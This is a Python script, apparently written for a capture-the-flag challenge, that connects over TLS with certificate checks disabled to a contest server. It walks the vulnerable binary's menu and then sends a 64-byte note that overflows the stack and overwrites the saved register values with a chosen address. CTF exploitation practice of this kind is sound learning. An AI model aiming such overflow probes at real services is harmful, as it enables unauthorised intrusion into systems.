#!/usr/bin/env python3
"""Remote diagnostic: check binary version and stack addresss."""
import socket, ssl, time

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(10)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ssock = ctx.wrap_socket(sock, server_hostname=HOST)
ssock.connect((HOST, PORT))

def recv_until(marker, timeout=3):
    data = b''
    ssock.settimeout(timeout)
    while marker not in data:
        try:
            chunk = ssock.recv(4096)
            if not chunk:
                break
            data += chunk
        except socket.timeout:
            break
    return data

# Read initial menu
data = recv_until(b'> ')
print("=== Initial Menu ===")
print(data.decode(errors='replace')[-300:])

# Option 1: inspect fake ROP register (shows rop_register value)
print("\n--- Option 1: inspect ---")
ssock.send(b'1\n')
time.sleep(0.3)
data = recv_until(b'> ')
print(data.decode(errors='replace')[-300:])

# Option 4: hint
print("\n--- Option 4: hint ---")
ssock.send(b'4\n')
time.sleep(0.3)
data = recv_until(b'> ')
print(data.decode(errors='replace')[-300:])

# Now try a simple calibration to see where it crashes
# Use a note that does NOT exploit, just fills with 'A's
print("\n--- Option 3: calibrate with safe input ---")
ssock.send(b'3\n')
time.sleep(0.3)
data = recv_until(b'note> ')
print(data.decode(errors='replace')[-200:])

# Send a short note (8 bytes - no overflow)
ssock.send(b'AAAAAAAA\n')
time.sleep(0.5)
data = recv_until(b'> ', timeout=5)
print(f"\nAfter safe calibration: {len(data)}B")
print(data.decode(errors='replace')[-300:])

# Now try longer note that overflows but doesn't exploit
print("\n--- Option 3 again: overflow without exploit ---")
ssock.send(b'3\n')
time.sleep(0.3)
data = recv_until(b'note> ')

# Send 64 bytes that mimic the original saved values
# Notes[48-63] should be the original saved R29/R31 to not crash
note = bytearray(64)
# Don't know original values - try zeros
import struct
struct.pack_into('<I', note, 48, 0x4080e4f8)
struct.pack_into('<I', note, 52, 0x4080e4f8)  # address that exists
struct.pack_into('<I', note, 56, 0x4080e4f8)
struct.pack_into('<I', note, 60, 0x4080e4f8)

ssock.send(bytes(note) + b'\n')
time.sleep(1)
try:
    data = recv_until(b'> ', timeout=5)
    print(f"After overflow: {len(data)}B")
    print(data.decode(errors='replace')[-500:])
except:
    print("No response after overflow - likely crashed")

ssock.close()
